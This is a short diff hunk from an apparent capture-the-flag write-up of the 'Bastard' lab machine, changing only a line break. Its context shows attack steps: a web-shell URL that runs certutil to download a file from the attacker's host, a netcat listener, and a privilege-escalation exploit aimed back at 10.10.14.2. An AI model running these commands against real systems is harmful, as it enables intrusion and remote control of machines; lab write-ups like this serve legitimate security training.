@@ -93,7 +93,7 @@ http://10.10.10.9/test.php?cmd=certutil%20-urlcache%20-split%20-f%20%22http://10
 ``` 
 
 I used netcat to listen to 1235 port on my Kali Linux: ```nc -nlvp 1235``` , and ran the exploit on the windows machine: </br>
-```privesc.exe 10.10.14.2 1234``` </br>
+```privesc.exe 10.10.14.2 1234``` </br> </br>
 ![privesc_exploit](images/bastard/privesc_exploit.png) </br>
 ![privesc_exploit2](images/bastard/privesc_exploit2.png) </br>
 
